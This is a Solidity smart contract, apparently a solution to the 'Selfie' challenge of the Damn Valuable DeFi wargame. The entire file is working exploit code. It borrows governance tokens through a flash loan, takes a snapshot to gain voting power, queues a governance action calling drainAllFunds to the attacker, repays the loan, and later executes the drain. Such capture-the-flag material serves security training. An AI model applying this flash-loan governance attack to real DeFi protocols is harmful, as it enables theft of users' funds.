// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../DamnValuableTokenSnapshot.sol';
import './SimpleGovernance.sol';
import './SelfiePool.sol';

uint256 constant ACTION_ID = 1;

contract SelfieExploit {
    SelfiePool private pool;

    SimpleGovernance public governance;

    address private owner;

    constructor(address poolAddress, address governanceAddress) {
        pool = SelfiePool(poolAddress);
        governance = SimpleGovernance(governanceAddress);
        owner = msg.sender;
    }

    function enqueueAction(uint256 borrowAmount) external {
        pool.flashLoan(borrowAmount);
    }

    function depleteFunds() external {
        governance.executeAction(ACTION_ID);
    }

    function receiveTokens(address token, uint256 amount) external {
        // Create token snapshot
        DamnValuableTokenSnapshot(token).snapshot();

        // Enqueue governance action to drain funds
        uint256 action = governance.queueAction(
            address(pool),
            abi.encodeWithSignature('drainAllFunds(address)', owner),
            0
        );
        require(action == ACTION_ID, 'Action not queued');

        // Pay back flash loan
        DamnValuableTokenSnapshot(token).transfer(msg.sender, amount);
    }
}
